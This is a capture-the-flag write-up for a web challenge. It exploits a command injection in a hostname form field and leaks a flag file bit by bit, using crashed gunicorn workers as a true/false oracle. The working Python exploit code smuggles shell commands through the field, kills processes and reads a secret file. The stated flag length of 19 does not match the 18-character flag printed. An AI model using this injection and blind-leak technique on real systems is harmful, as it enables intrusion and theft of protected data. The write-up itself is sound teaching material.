# web/Ping Pong: Under Maintenance
So in this challenge we see that we have a command injection vulnerability that we can exploit similarly to the one in the previous challenge. However, instead of just adding a semicolon to start a new command and then `cat`ing the flag, we can't see the output.

I then tried just using a command to put the flag text into `templates/index.html`, and putting some new code inside the `main.py` file, but neither worked because the templates weren't automatically reloaded (and the code had even lower chances of reloading if the templates didn't).

My next instinct was to do some sort of data exfiltration over the network (like sending a HTTP request to some remote server). But someone foresaw this, and outbound connections are disabled on the machine.

Then I thought, "it says that outbound connections are disabled, but it doesn't say anything about inbound connections!" My first instinct was to do some sort of reverse shell or static file server that would serve the user the flag file. But the problem is that only a certain port is forwarded for the web server, and I would have to stop the existing server to run a new server. However, stopping the server stopped the entire container that the challenge was running on (as later confirmed by eyangch). (Sadly, I spent 2 days in-contest on this flawed route.)

So I tried to look for some sort of indirect leak. I realized that even if I couldn't stop the entire web server without crashing the whole challenge, I could crash part of it to indicate a true or false state. And then, I could use that to leak the flag, bit by bit.

I knew from previous attempts that gunicorn spawned worker processes for each request, so killing the subprocess would stop the connection without making the entire server crash, which made it feasible to carry out without having to restart the server a bunch of times.

To make things easier, I created some utility functions that would crash/not crash a process depending on a boolean value. I used Python on the remote server to validate conditions to make things simpler. 
```python3
def send(command):
    try:
        r = requests.post(host, data={'hostname': 'a; ' + command})
        return False
    except requests.exceptions.ConnectionError:
        return True
    
def test(cond):
    # single quotes required in cond
    return send(r'''python3 -c "import os; flag = open('flag.txt').read(); os.popen('kill -9 $PPID') if (''' + cond + ') else 1"')
```
To leak the flag, I first had to find out the length to figure out how much to loop, which I did by just incrementing a counter value (because I assumed that the flag would be fairly short). 
```python3
def getlen(s):
    l = 0
    while not test(f"len({s}) == {l}"):
        l += 1 
    return l 

#print(getlen('flag'))
# flag length = 19
```
Then, it was just a matter of extracting bits from each character, and I had the flag!
```python3
def leakchar(c):
    n = 0
    for i in range(8):
        b = test(f"(ord({c}) & (1<<{i})) > 0")
        if b: b = 1 
        else: b = 0
        #print(b)
        n += b << i
    return chr(n)
# ...
flaglen = 19
def leakstr(s, l):
    res = ''
    for i in range(l):
        res += leakchar(f"{s}[{i}]")
        print(res)
    return res
flag = leakstr('flag', flaglen)
print(flag)
# LITCTF{c4refu1_fr}
```



